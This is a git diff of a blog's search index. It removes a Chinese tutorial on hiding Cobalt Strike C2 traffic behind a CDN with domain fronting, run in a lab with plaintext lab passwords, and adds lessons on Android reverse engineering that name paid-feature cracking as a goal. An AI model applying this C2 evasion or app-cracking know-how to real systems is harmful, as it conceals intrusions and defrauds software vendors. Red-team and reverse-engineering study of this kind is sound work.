@@ -1,79 +1,489 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>CS流量隐藏-域前置技术</title>
-    <url>/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/</url>
-    <content><![CDATA[<h2 id="什么是域前置"><a href="#什么是域前置" class="headerlink" title="什么是域前置"></a>什么是域前置</h2><p>Domain Fronting，中文译名 “域前置” 或 “域名前置”，是一种用于隐藏真实C2(Command and Control)服务器IP且同时能伪装为与高信誉域名通信的技术，多用于木马受控端和控制端之间的隐蔽通信。</p>
-<p>利用该技术，可以让受控端以为程序是在和一个高信誉域名通信，但实际上却是在和我们的C2服务器进行通信</p>
-<h2 id="其他知识–域名解析记录类型"><a href="#其他知识–域名解析记录类型" class="headerlink" title="其他知识–域名解析记录类型"></a>其他知识–域名解析记录类型</h2><p>1、A (Address) 记录<br>是用来指定<a href="https://so.csdn.net/so/search?q=%E4%B8%BB%E6%9C%BA%E5%90%8D&spm=1001.2101.3001.7020">主机名</a>（或域名）对应的IP地址记录。用户可以将该域名下的网站服务器指向到自己的web server上。同时也可以设置您域名的二级域名。</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/b387c7e7abb08c5c048d3a6e807cb9f6.png" alt="img"></p>
-<p>2、别名(CNAME)记录<br>也被称为规范名字。这种记录允许您将多个名字映射到同一台计算机。 通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为“host.mydomain.com”（A记录）。 它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。 这两个别名的全称就是“<a href="http://www.mydomain.com”和“mail.mydomain.com”.实际上他们都指向“host.mydomain.com”./">www.mydomain.com”和“mail.mydomain.com”。实际上他们都指向“host.mydomain.com”。</a></p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/1efd3987e07018e881857b4561bc87ee.png" alt="img"></p>
-<p>3、MX（Mail Exchanger）记录<br>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据 收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给 <a href="mailto:&#117;&#x73;&#101;&#x72;&#x40;&#122;&#104;&#x6f;&#x6e;&#103;&#x6a;&#x69;&#101;&#x2e;&#x63;&#111;&#109;">&#117;&#x73;&#101;&#x72;&#x40;&#122;&#104;&#x6f;&#x6e;&#103;&#x6a;&#x69;&#101;&#x2e;&#x63;&#111;&#109;</a> 时，该用户的邮件系统通过DNS查找zhongjie.com这个域名的MX记录，如果MX记录存在， 用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/6cc3e66a493470c669a38c15a8a9343d.png" alt="img"></p>
-<p>4、TXT记录<br>TXT记录一般指为某个主机名或域名设置的说明，如：<br>1）admin IN TXT “jack, mobile:13800138000”；<br>2）mail IN TXT “邮件主机, 存放在xxx ,管理人：AAA”，Jim IN TXT “contact: <a href="mailto:&#x61;&#98;&#x63;&#64;&#x6d;&#x61;&#x69;&#x6c;&#115;&#x65;&#x72;&#118;&#x65;&#x72;&#46;&#99;&#111;&#109;">&#x61;&#98;&#x63;&#64;&#x6d;&#x61;&#x69;&#x6c;&#115;&#x65;&#x72;&#118;&#x65;&#x72;&#46;&#99;&#111;&#109;</a>“也就是您可以设置 TXT ，以便使别人联系到您。</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/9b56f3771ee8c12a6c4b9e1ab7c8e08a.png" alt="img"></p>
-<p>5、NS记录<br>ns记录全称为Name Server 是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的。这里的NS记录只对子域名生效。例如用户希望由12.34.56.78这台服务器解析news.mydomain.com，则需要设置news.mydomain.com的NS记录。</p>
-<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><h3 id="域控制器"><a href="#域控制器" class="headerlink" title="域控制器"></a>域控制器</h3><p>Windows Server 2008 R2: 192.168.184.132（NAT）</p>
-<p>域名：wcl078.shiyan078</p>
-<p>用户名：administrator</p>
-<p>密码：123456@abc</p>
-<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095907956.png" alt="image-20220509095907956"></p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509095956218.png" alt="image-20220509095956218"></p>
-<p>继续安装AD配置域名为wcl078.shiyan078</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/image-20220509100037635.png" alt="image-20220509100037635"></p>
-<p>创建一个域用户wcl078，密码使123456@abc</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002.jpg" alt="img"></p>
-<h3 id="域成员服务器"><a href="#域成员服务器" class="headerlink" title="域成员服务器"></a>域成员服务器</h3><p>Windows7: 192.168.184.153（NAT）</p>
-<p>域名：wcl078.shiyan078</p>
-<p>用户名：wcl078</p>
-<p>密码：123456@abc</p>
-<h3 id="CS服务端"><a href="#CS服务端" class="headerlink" title="CS服务端"></a>CS服务端</h3><p>Ubuntu:（公网ip）</p>
-<p>安装jdk8</p>
-<p>apt install openjdk-8-jre-headless</p>
-<h3 id="CS客户端"><a href="#CS客户端" class="headerlink" title="CS客户端"></a>CS客户端</h3><p>kali: 192.168.3.78 (桥接模式，不能是NAT，不然之后用wireshark抓取流量的时候会抓到CS客户端与服务端通信的流量，因为wireshark抓的是网卡的流量，别问我为什么知道QAQ)</p>
-<p>更换JDK</p>
-<p>由于我的kali自带jdk11需要更换为jdk8</p>
-<p>访问<a href="https://www.oracle.com/java/technologies/downloads/#java8%EF%BC%8C%E4%B8%8B%E8%BD%BDjdk8">https://www.oracle.com/java/technologies/downloads/#java8，下载jdk8</a></p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652061818255.jpg" alt="img"></p>
-<p>下载后将该压缩包放到kali虚拟机中，执行</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 解压压缩包</span></span><br><span class="line">tar zxvf jdk-8u331-linux-x64.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将解压后的文件移动到/opt目录下</span></span><br><span class="line">mv ./jdk1.8.0_251/ /opt/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 然后使用update-alternatives命令进行安装</span></span><br><span class="line">update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_331/bin/java 1</span><br><span class="line"></span><br><span class="line">update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_331/bin/javac 1</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> java /opt/jdk1.8.0_331/bin/java</span><br><span class="line"></span><br><span class="line">update-alternatives --<span class="built_in">set</span> javac /opt/jdk1.8.0_331/bin/javac</span><br></pre></td></tr></table></figure>
-
-<p>最后使用<code>java -version</code>查看版本，更换成功</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062807196.jpg" alt="img"></p>
-<p>补充：若之后想切换回jdk11，执行<code>update-alternatives --config java</code>来选择切换</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652062821709.jpg" alt="img"></p>
-<h2 id="CS实现域前置"><a href="#CS实现域前置" class="headerlink" title="CS实现域前置"></a>CS实现域前置</h2><p>需要一个域名和CND，这里我是在某云注册的域名和CDN</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065755641.jpg" alt="img"></p>
-<p>这里使用站长之家的多地ping来看CDN是否生效<a href="http://ping.chinaz.com/%EF%BC%8C%E6%9C%89%E4%B8%8D%E5%90%8Cip%E5%8D%B3%E5%8F%AF">http://ping.chinaz.com/，有不同ip即可</a></p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065770486.jpg" alt="img"></p>
-<p>服务端cs在运行时需要加一个.profile文件，我是基于<a href="https://github.com/rsmudge/Malleable-C2-Profiles/blob/master/normal/amazon.profile">amazon.profile</a>文件的基础上改了两个地方，将Host改为我的域名</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065963543.jpg" alt="img"></p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652065967848.jpg" alt="img"></p>
-<p>改好后重新运行teamserver，<code>/teamserver vpsip mima amazon.profile</code></p>
-<p>之后kali客户端连接，配置监听器</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image001.png" alt="img"></p>
-<p>再利用cs生成攻击命令</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066019120.jpg" alt="img"></p>
-<p>然后在受害主机win7的cmd中执行刚刚生成攻击命令,之后CS上线</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066172741.jpg" alt="img"></p>
-<p>在weblog中查看结果如下</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066202884.jpg" alt="img"></p>
-<p>在受害主机win7上使用wireshark抓包分析，过滤出ip为vpsip的，发现并没有流量，说明域前置隐藏成功</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066215882.jpg" alt="img"></p>
-<p>还可以在cmd中执行netstat查看建立的连接，并不是和我的vps建立的，也能说明CDN生效了</p>
-<p><img src="/2022/05/09/CS%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F-%E5%9F%9F%E5%89%8D%E7%BD%AE%E6%8A%80%E6%9C%AF/clip_image002-1652066228717.jpg" alt="img"></p>
-<p>到此域前置到此部署完毕</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/articles/network/276159.html">域前置攻击复现</a></p>
-<p><a href="https://www.anquanke.com/post/id/195011">基于国内某云的 Domain Fronting 技术实践</a></p>
-<p><a href="https://blog.csdn.net/qq_43968080/article/details/105586109">Kali重新安装JAVA环境</a></p>
-<p><a href="https://blog.csdn.net/userpass_word/article/details/103838606">Kali中安装Java环境</a></p>
-<h2 id="拓展了解"><a href="#拓展了解" class="headerlink" title="拓展了解"></a>拓展了解</h2><p><a href="https://www.freebuf.com/articles/web/271046.html">域前置之“中外差异”</a></p>
+    <title>001第一节.模拟器环境搭建</title>
+    <url>/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
+    <content><![CDATA[<h2 id="什么是安卓逆向"><a href="#什么是安卓逆向" class="headerlink" title="什么是安卓逆向"></a>什么是安卓逆向</h2><p>安卓逆向是指对已经打包好的安卓应用程序进行反编译、源码分析，以了解应用程序的内部工作原理，获取应用程序的敏感信息，或者修改应用程序的行为。这是一门技术，可以帮助开发人员更好地了解应用程序的实现逻辑，以便更好地保护应用程序的安全性。</p>
+<h2 id="安卓逆向可以干嘛"><a href="#安卓逆向可以干嘛" class="headerlink" title="安卓逆向可以干嘛"></a>安卓逆向可以干嘛</h2><p>去更新<br>去广告<br>内购/会员破解<br>协议自动签到<br>白嫖！！！😆</p>
+<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><h3 id="Magisk介绍"><a href="#Magisk介绍" class="headerlink" title="Magisk介绍"></a>Magisk介绍</h3><p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906155540378.png" alt="image-20230906155540378"></p>
+<p>Magisk 是一套用于定制 Android 的开源软件，支持高于 Android 5.0 的设备。</p>
+<p>以下是一些功能亮点：</p>
+<ul>
+<li><strong>MagiskSU</strong>：为应用程序提供 root 访问权限</li>
+<li><strong>Magisk 模块</strong>：通过安装模块修改只读分区</li>
+<li><strong>MagiskHide</strong>：从根检测 / 系统完整性检查中隐藏 Magisk(Shamiko)</li>
+<li><strong>MagiskBoot</strong> : 最完整的安卓启动镜像解包和重新打包工具</li>
+</ul>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>参考：<a href="https://www.52pojie.cn/thread-1583586-1-1.html">适用于几乎所有安卓模拟器(7+)安装magisk的教程-简单无脑向</a></p>
+<ol>
+<li><p>到官网下载9.0模拟器，并安装</p>
+<p>开启ROOT权限，</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906160231051.png" alt="image-20230906160231051"></p>
+<p>开启磁盘共享可写入</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906160255987.png" alt="image-20230906160255987"></p>
+<p>开启后重启模拟器</p>
+</li>
+<li><p>安装magisk</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/%E5%AE%89%E8%A3%85magisk.png" alt="安装magisk"></p>
+<p>安装好后重启模拟器</p>
+<p>重启后再打开Magisk进行一些设置</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906162346468.png" alt="image-20230906162346468"></p>
+</li>
+<li><p>在Magisk上安装LSPosed模块</p>
+<p>先把LSPosed-v1.8.3-6552-zygisk-release.zip拖到共享文件夹里</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906163048720.png" alt="image-20230906163048720"></p>
+<p>然后在Magisk里点击”模块”-&gt;”从本地安装”-&gt;在Pictures文件夹里找到LSPosed-v1.8.3-6552-zygisk-release.zip进行双击即可</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906163225535.png" alt="image-20230906163225535"></p>
+<p>安装完成后重启模拟器，就能看到该模块安装成功</p>
+<p><img src="/2023/08/01/001%E7%AC%AC%E4%B8%80%E8%8A%82.%E6%A8%A1%E6%8B%9F%E5%99%A8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/image-20230906163300951.png" alt="image-20230906163300951"></p>
+</li>
+</ol>
+<h2 id="相关资源"><a href="#相关资源" class="headerlink" title="相关资源"></a>相关资源</h2><p><a href="https://www.52pojie.cn/thread-1695141-1-1.html">《安卓逆向这档事》一、模拟器环境搭建</a></p>
+<p><a href="https://www.bilibili.com/video/BV1wT411N7sV/?spm_id_from=333.880.my_history.page.click&amp;vd_source=fb474708f246c21e5933eeb76372688d">https://www.bilibili.com/video/BV1wT411N7sV/?spm_id_from=333.880.my_history.page.click&amp;vd_source=fb474708f246c21e5933eeb76372688d</a></p>
+<p><a href="https://www.aliyundrive.com/s/TJoKMK6du6x">https://www.aliyundrive.com/s/TJoKMK6du6x</a></p>
 ]]></content>
+      <categories>
+        <category>安卓逆向</category>
+      </categories>
       <tags>
-        <tag>渗透测试</tag>
-        <tag>域前置技术</tag>
-        <tag>Cobaltstrike</tag>
+        <tag>re</tag>
+        <tag>Android</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>002第二节.初识APK文件结构、双开、汉化、基础修改</title>
+    <url>/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/</url>
+    <content><![CDATA[<h2 id="课程目标"><a href="#课程目标" class="headerlink" title="课程目标"></a>课程目标</h2><ol>
+<li>了解APK文件结构</li>
+<li>双开APK，简单了解原理</li>
+<li>汉化APK</li>
+<li>简单修改APK名字、图标</li>
+</ol>
+<h2 id="使用到的工具"><a href="#使用到的工具" class="headerlink" title="使用到的工具"></a>使用到的工具</h2><ol>
+<li>教程Demo</li>
+<li>MT管理器/NP管理器</li>
+<li>开发者助手</li>
+<li>雷电模拟器</li>
+</ol>
+<p>注意：使用NP管理器需要断网，因为联网后要强制更新，更新后有些功能要登陆才能使用</p>
+<h2 id="学习内容"><a href="#学习内容" class="headerlink" title="学习内容"></a>学习内容</h2><h3 id="APK结构"><a href="#APK结构" class="headerlink" title="APK结构"></a>APK结构</h3><p>apk 全称 Android Package，它相当于一个压缩文件，只要在电脑上将apk后缀改为zip即可解压。</p>
+<table>
+<thead>
+<tr>
+<th align="left">文件</th>
+<th align="left">注释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">assets目录</td>
+<td align="left">存放APK的静态资源文件，比如视频，音频，图片等</td>
+</tr>
+<tr>
+<td align="left">lib 目录</td>
+<td align="left">armeabi-v7a基本通用所有android设备，arm64-v8a只适用于64位的android设备，x86常见用于android模拟器，其目录下的.so文件是c或c++编译的动态链接库文件</td>
+</tr>
+<tr>
+<td align="left">META-INF目录</td>
+<td align="left">保存应用的签名信息，签名信息可以验证APK文件的完整性，相当于APK的身份证(验证文件是否又被修改)</td>
+</tr>
+<tr>
+<td align="left">res目录</td>
+<td align="left">res目录存放资源文件，包括图片，字符串等等，APK的脸蛋（UI）由他的layout文件设计</td>
+</tr>
+<tr>
+<td align="left">AndroidMainfest.xml文件</td>
+<td align="left">APK的应用清单信息，它描述了应用的名字，版本，权限，引用的库文件等等信息</td>
+</tr>
+<tr>
+<td align="left">classes.dex文件</td>
+<td align="left">classes.dex是java源码编译后生成的java字节码文件，APK运行的主要逻辑</td>
+</tr>
+<tr>
+<td align="left">resources.arsc文件</td>
+<td align="left">resources.arsc是编译后的二进制资源文件，它是一个映射表，映射着资源和id，通过R文件中的id就可以找到对应的资源</td>
+</tr>
+</tbody></table>
+<p>案例apk解压后如下图（该图中无assets和lib目录，也就是说这两个目录不一定每个apk都有）</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906164848491.png" alt="image-20230906164848491"></p>
+<p>了解了上述的所展示的文件的作用后，以后我们在对apk进行修改时就能快速定位。比如要修改一个图片或音频，就应该从assets目录中去修改或替换；如果要修改apk的一个主要逻辑，就应该对.dex文件进行修改</p>
+<h3 id="双开及原理"><a href="#双开及原理" class="headerlink" title="双开及原理"></a>双开及原理</h3><p>双开：简单来说，就是手机同时运行两个或多个相同的应用，例如同时运行两个微信</p>
+<p>下述四种后三种对初学来说较为困难，故只复现第一种：修改包名。</p>
+<table>
+<thead>
+<tr>
+<th align="left">原理</th>
+<th align="left">解释</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">修改包名</td>
+<td align="left">让手机系统认为这是2个APP，这样的话就能生成2个数据存储路径，此时的多开就等于你打开了两个互不干扰的APP</td>
+</tr>
+<tr>
+<td align="left">修改Framework</td>
+<td align="left">对于有系统修改权限的厂商，可以修改Framework来实现双开的目的，例如：小米自带多开</td>
+</tr>
+<tr>
+<td align="left">通过虚拟化技术实现</td>
+<td align="left">虚拟Framework层、虚拟文件系统、模拟Android对组件的管理、虚拟应用进程管理 等一整套虚拟技术，将APK复制一份到虚拟空间中运行，例如：平行空间</td>
+</tr>
+<tr>
+<td align="left">以插件机制运行</td>
+<td align="left">利用反射替换，动态代{过}{滤}理，hook了系统的大部分与system—server进程通讯的函数，以此作为“欺上瞒下”的目的，欺骗系统“以为”只有一个apk在运行，瞒过插件让其“认为”自己已经安装。例如：VirtualApp</td>
+</tr>
+</tbody></table>
+<p>使用np管理器对案例app进行安装包提取，提取后使用np管理器的APK共存功能，确定后</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906165954710.png" alt="image-20230906165954710"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906170047960.png" alt="image-20230906170047960"></p>
+<p>该方法的弊端：因为修改包名会导致签名信息发生变化，重新安装apk，若该apk校验了签名信息，则会发生闪退或崩溃的情况。</p>
+<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><p>对如下内容进行汉化</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906172518014.png" alt="image-20230906172518014"></p>
+<p>外加修改app封面图标和app的名称</p>
+<h4 id="简单的逆向流程"><a href="#简单的逆向流程" class="headerlink" title="简单的逆向流程"></a>简单的逆向流程</h4><p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906170912371.png" alt="image-20230906170912371"></p>
+<h4 id="汉化APK"><a href="#汉化APK" class="headerlink" title="汉化APK"></a>汉化APK</h4><p>汉化：使用专门的工具对外文版的软件资源进行读取、翻译、修改、回写等一系列处理，使软件的菜单、对话框、提示等用户界面显示为中文，而程序的内核和功能保持不变，这个过程即为软件汉化</p>
+<h5 id="Xml汉化"><a href="#Xml汉化" class="headerlink" title="Xml汉化"></a>Xml汉化</h5><p>对”Hello 52pojie”进行汉化</p>
+<p><strong>搜索字符串定位</strong>：</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906172601462.png" alt="image-20230906172601462"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906172630363.png" alt="image-20230906172630363"></p>
+<p>反编译后进行修改</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906172828496.png" alt="image-20230906172828496"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906172847282.png" alt="image-20230906172847282"></p>
+<h5 id="Arsc汉化"><a href="#Arsc汉化" class="headerlink" title="Arsc汉化"></a>Arsc汉化</h5><p>对”Я не могу поверить, что это работает, почему?”进行汉化</p>
+<p>需要借助“<strong>开发者助手</strong>”来复制字符串</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173141645.png" alt="image-20230906173141645"></p>
+<p>复制后进行<strong>搜索字符串定位</strong></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173230544.png" alt="image-20230906173230544"></p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173332494.png" alt="image-20230906173332494"></p>
+<p>点击该文件选择“翻译模式”</p>
+<p><img src="/2023/08/27/002%E7%AC%AC%E4%BA%8C%E8%8A%82.%E5%88%9D%E8%AF%86APK%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E3%80%81%E5%8F%8C%E5%BC%80%E3%80%81%E6%B1%89%E5%8C%96%E3%80%81%E5%9F%BA%E7%A1%80%E4%BF%AE%E6%94%B9/image-20230906173425442.png" alt="image-20230906173425442"></p>
+<p>进去后点击”[DEFAULT]”，然后过滤</p>
